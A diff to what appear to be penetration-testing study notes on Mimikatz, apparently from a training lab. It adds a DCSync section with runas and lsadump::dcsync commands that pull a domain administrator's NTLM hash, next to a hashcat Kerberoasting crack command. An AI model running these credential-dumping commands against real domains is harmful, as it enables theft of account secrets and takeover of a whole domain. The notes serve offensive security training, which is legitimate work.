@@ -4,6 +4,7 @@ tags:
   - PtH
   - PtT
   - kerberoasting
+  - dcsync
 ---
 # Modules
 ## Logon Passwords
@@ -88,3 +89,18 @@ $krb5tgs$23$*sqldev.kirbi*$813149fb<SNIP>8e71a057feeab
 ```shell-session
 $ hashcat -m 13100 sqldev_tgs.hashcat /usr/share/wordlists/rockyou.txt
 ```
+# DCSync
+Mimikatz must be ran in the context of the user who has DCSync privileges and only one user can be attacked at a time.
+```cmd-shell
+> runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+```powershell
+PS > .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+... SNIP ...
+	NTLM: <NTLM-HASH>
+... SNIP ...
+```
+
+
